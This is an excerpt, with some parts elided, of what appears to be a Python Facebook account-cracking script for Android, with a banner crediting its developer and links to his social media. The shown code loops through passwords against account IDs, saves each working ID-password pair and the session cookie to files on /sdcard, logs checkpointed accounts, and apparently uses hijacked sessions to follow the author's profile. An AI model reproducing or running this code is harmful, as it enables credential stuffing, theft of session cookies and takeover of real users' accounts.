...
{Y}*******************************************************
{B} [{R}✔{B}] {Y}DEVELOPER  :{G} SAIF VAIYA 
{B} [{R}✔{B}] {B}FACEBOOK   :{G} Md Sifuddin
{B} [{R}✔{B}] {nb}YOUTUBE   :{G} SAIF OFFICIAL 
{B} [{R}✔{B}] {R}VERSION    :{G} 2.2.1
{Y}*******************************************************"""

def fb():

    s("xdg-open https://www.facebook.com/msaif143?mibextid=ZbWKwL")

def git():

    s(" os.system('xdg-open https://www.youtube.com/@MDSIFUDDIN')")

def git():

    s("xdg-open https://www.youtube.com/@MDSIFUDDIN")
...
def o():
    ...
    sefat(f' \x1b[1;32m{B}[{R}3{B}] \x1b[1;32m{P}SUBSCRIBE MY YOUTUBE CHANNEL')
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/msaif143', {
...
def i():
    ...
    s("xdg-open https://www.facebook.com/msaif143")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"{G} [ SAIF-OK🥳 ] {cid} | {ps}")

                print(f"{B} [  COOKIE  ] {coki}")

                cek_apk(session,coki)

                open('/sdcard/SAIF-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print(f"{R} [ SAIF-CP☹️ ] {cid} | {ps}")

                open('/sdcard/SAIF-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[SAIF] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
